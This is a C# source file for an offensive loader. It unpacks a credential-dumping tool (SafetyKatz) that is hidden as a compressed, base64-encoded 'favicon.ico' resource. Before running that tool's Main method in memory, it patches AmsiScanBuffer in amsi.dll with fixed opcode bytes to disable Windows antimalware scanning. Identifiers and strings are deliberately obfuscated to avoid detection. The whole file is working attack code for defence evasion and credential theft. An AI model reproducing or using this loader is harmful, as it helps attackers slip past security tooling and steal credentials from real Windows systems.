using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace NoAmci {
        class Program {
            
            private static byte[] s4 = new byte[] { 0xC3, 0x80, 0x07, 0x00, 0x57, 0xB8 };
            private static byte[] e6 = new byte[] { 0x00, 0x18, 0xC2, 0x80, 0x07, 0x00, 0x57, 0xB8 };
            static void Main(string[] args) {

                Assembly assembly = Assembly.GetExecutingAssembly();
                Stream stream = null;

                // favicon.ico is an encoded and compressed version of s"a"f"t"y"k"a"t"z using DeflateStream and GzipStream APIs. (XOR encrypt if required).
                stream = assembly.GetManifestResourceStream("NoAmci.favicon.ico");

                string decCompressedAssembly = Encoding.Default.GetString(Helper.gzipDecompress(stream));

                decCompressedAssembly = decCompressedAssembly.Replace("\0", string.Empty);

                byte[] decoded = Convert.FromBase64String(decCompressedAssembly);

                byte[] assemblyBin = Helper.deflateDecompress(decoded);

                //add assembly arguments here if needed.
                string[] arguments = new string[] { };
                PLoad(assemblyBin, arguments);
            }

            private static void PLoad(byte[] bytes, string[] args) {
                try {

                    Array.Reverse(s4);
                    Array.Reverse(e6);

                    byte[] opcodes = new byte[] { };

                    if (is64B())
                        opcodes = s4;
                    else
                        opcodes = e6;

                    //AmciSc4nbuffer hash using 0xdeadbeef as a key.
                    String amciSBufferfunctionHash = "829D7CDD764BC6DB1D0150C2D5769758";

                    //Retrieving AmciSc4nbuffer address using DInvoke (Thanks to the @TheWover and @FuzzySec) => Locating AmciSc4nBuffer memory address without having to rely on LoadLibrary, GetProcAddress or any other API that may trigger AMSI detections.
                    IntPtr pAmciSBuffer = SPEx2.Generic.GetLibraryAddress("a" + "m" + "s" + "i" + "." + "d" + "l" + "l", amciSBufferfunctionHash, 0xfeedfeed, true);

                    uint cOld = 0;
                    //Change 4msi dll memory permission to RW 
                    SPEx2.Win32.VirtualProtect(pAmciSBuffer, (UIntPtr)opcodes.Length, 0x04, ref cOld);
                    
                    //Patch AmciSc4nbuffer (Based on @RastaMouse bypass).
                    Marshal.Copy(opcodes, 0, pAmciSBuffer, opcodes.Length);
                    
                    //Restore initial memory permission (RX)
                    SPEx2.Win32.VirtualProtect(pAmciSBuffer, (UIntPtr)opcodes.Length, 0x20, ref cOld); 
                    
                    //Loading decompressed s4ftyk4tz assembly and calling its main function.
                    var assembly = Assembly.Load(bytes);

                    foreach (var type in assembly.GetTypes()) {
                        foreach (MethodInfo method in type.GetMethods()) {
                            if ((method.Name.ToLower()).Equals("Main".ToLower())) {
                                object instance = Activator.CreateInstance(type);
                                method.Invoke(instance, new object[] { args });
                                return;
                            }
                        }
                    }
                }
                catch (ReflectionTypeLoadException ex) {
                    Console.WriteLine(ex.Message + ex.InnerException);
                }

            }

            private static bool is64B() {
                bool is64B = true;

                if (IntPtr.Size == 4)
                    is64B = false;

                return is64B;
            }
        }

    }

